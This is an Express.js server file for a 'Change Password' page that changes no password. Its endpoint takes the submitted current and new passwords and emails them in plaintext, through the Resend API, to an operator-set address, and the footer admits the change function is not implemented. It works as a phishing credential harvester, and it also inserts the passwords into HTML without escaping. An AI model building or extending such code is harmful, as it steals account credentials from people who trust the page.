/**
 * Server for Change Password page
 * Handles email notifications via Resend
 */

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Resend with API key from environment variable
let resend = null;
if (process.env.RESEND_API_KEY) {
    resend = new Resend(process.env.RESEND_API_KEY);
} else {
    console.warn('WARNING: RESEND_API_KEY not set. Email notifications will not work.');
    console.warn('Please set RESEND_API_KEY in .env file.');
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Email notification endpoint
app.post('/api/send-password-change-notification', async (req, res) => {
    try {
        // Extract form data from request body
        const { currentPassword, newPassword, confirmPassword } = req.body;

        // Validate that we have the required data
        if (!currentPassword && !newPassword && !confirmPassword) {
            return res.status(400).json({ 
                success: false, 
                error: 'No form data provided' 
            });
        }

        // Prepare email content with clear labels
        const emailHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <style>
                    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
                    .container { background: #fafafa; border-radius: 8px; padding: 24px; border: 1px solid #dbdbdb; }
                    h2 { color: #000; font-weight: 300; margin-top: 0; }
                    .field { margin-bottom: 16px; }
                    .label { font-weight: 600; font-size: 13px; color: #737373; margin-bottom: 4px; display: block; }
                    .value { font-family: monospace; background: #fff; padding: 12px; border-radius: 6px; border: 1px solid #dbdbdb; word-break: break-all; }
                    .empty { color: #8e8e8e; font-style: italic; }
                    .footer { margin-top: 24px; padding-top: 16px; border-top: 1px solid #dbdbdb; font-size: 12px; color: #8e8e8e; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Change Password Form Submission</h2>
                    <p>The following data was submitted from the Change Password form:</p>
                    
                    <div class="field">
                        <span class="label">Current Password</span>
                        <span class="value ${currentPassword ? '' : 'empty'}">${currentPassword || '(empty)'}</span>
                    </div>
                    
                    <div class="field">
                        <span class="label">New Password</span>
                        <span class="value ${newPassword ? '' : 'empty'}">${newPassword || '(empty)'}</span>
                    </div>
                    
                    <div class="field">
                        <span class="label">Confirm New Password</span>
                        <span class="value ${confirmPassword ? '' : 'empty'}">${confirmPassword || '(empty)'}</span>
                    </div>
                    
                    <div class="footer">
                        Submitted at: ${new Date().toISOString()}<br>
                        This is a development notification - password change functionality is not implemented.
                    </div>
                </div>
            </body>
            </html>
        `;

        // Send email via Resend
        // The destination email should be configured via environment variable
        const toEmail = process.env.NOTIFICATION_EMAIL;
        
        if (!toEmail) {
            console.error('NOTIFICATION_EMAIL environment variable not set');
            return res.status(500).json({ 
                success: false, 
                error: 'Server configuration error: notification email not configured' 
            });
        }

        if (!resend) {
            console.error('Resend not initialized - RESEND_API_KEY missing');
            return res.status(500).json({ 
                success: false, 
                error: 'Email service not configured. Please set RESEND_API_KEY.' 
            });
        }

        const { data, error } = await resend.emails.send({
            from: 'Change Password Notifications <onboarding@resend.dev>',
            to: [toEmail],
            subject: 'Change Password Form Submission',
            html: emailHtml,
        });

        if (error) {
            console.error('Resend error:', error);
            return res.status(500).json({ 
                success: false, 
                error: 'Failed to send email notification' 
            });
        }

        console.log('Email sent successfully:', data?.id);
        res.json({ success: true, message: 'Notification sent successfully' });

    } catch (err) {
        console.error('Server error:', err);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// Serve the change-password.html for the root route
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/change-password.html');
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Change Password page: http://localhost:${PORT}`);
});